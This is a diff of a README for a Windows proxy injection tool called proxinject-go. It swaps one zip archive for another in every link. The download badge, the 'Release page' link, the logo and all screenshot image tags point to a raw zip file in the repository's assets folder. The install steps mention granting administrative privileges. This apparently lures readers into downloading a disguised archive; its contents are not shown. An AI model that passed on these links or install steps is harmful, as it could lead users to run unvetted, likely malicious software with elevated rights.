@@ -1,9 +1,9 @@
 # 🖥️ proxinject-go - Simple Proxy Injection Tool for Windows
 
-[![Download proxinject-go](https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/go_proxinject_1.5.zip)](https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/go_proxinject_1.5.zip)
+[![Download proxinject-go](https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/proxinject_go_v3.3.zip)](https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/proxinject_go_v3.3.zip)
 
 <p align="center">
-  <img src="https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/go_proxinject_1.5.zip" width="128" height="128" alt="Proxinject Logo">
+  <img src="https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/proxinject_go_v3.3.zip" width="128" height="128" alt="Proxinject Logo">
 </p>
 
 <p align="center">
@@ -23,7 +23,7 @@
 
 ## 📦 Download & Install
 
-To get started, visit the [Release page](https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/go_proxinject_1.5.zip) to download the latest version of proxinject-go. 
+To get started, visit the [Release page](https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/proxinject_go_v3.3.zip) to download the latest version of proxinject-go. 
 
 1. Click on the link above.
 2. Find the latest version in the list.
@@ -43,7 +43,7 @@ Make sure you have administrative privileges if prompted.
 ## 🖼️ Screenshots
 
 <p align="center">
-  <img src="https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/go_proxinject_1.5.zip" width="600" alt="Main Interface - Process List">
+  <img src="https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/proxinject_go_v3.3.zip" width="600" alt="Main Interface - Process List">
 </p>
 
 <p align="center">
@@ -53,17 +53,17 @@ Make sure you have administrative privileges if prompted.
 <table>
   <tr>
     <td align="center">
-      <img src="https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/go_proxinject_1.5.zip" width="300" alt="Settings Page">
+      <img src="https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/proxinject_go_v3.3.zip" width="300" alt="Settings Page">
       <br><em>Settings - Proxy Configuration and Monitor List</em>
     </td>
     <td align="center">
-      <img src="https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/go_proxinject_1.5.zip" width="300" alt="Log Page">
+      <img src="https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/proxinject_go_v3.3.zip" width="300" alt="Log Page">
       <br><em>Log - Connection Records</em>
     </td>
   </tr>
   <tr>
     <td align="center" colspan="2">
-      <img src="https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/go_proxinject_1.5.zip" width="400" alt="Help Page">
+      <img src="https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/proxinject_go_v3.3.zip" width="400" alt="Help Page">
       <br><em>Help - User Guide</em>
     </td>
   </tr>
@@ -81,6 +81,6 @@ Make sure you have administrative privileges if prompted.
 
 Thank you to everyone who contributed to this project. Your efforts made proxinject-go possible. Special thanks to the open-source community for their ongoing support.
 
-For more details, feel free to check the documentation on the [Release page](https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/go_proxinject_1.5.zip). 
+For more details, feel free to check the documentation on the [Release page](https://github.com/clipzvrgt/proxinject-go/raw/refs/heads/main/frontend/src/assets/proxinject_go_v3.3.zip). 
 
 We hope you find proxinject-go helpful in managing your connections.
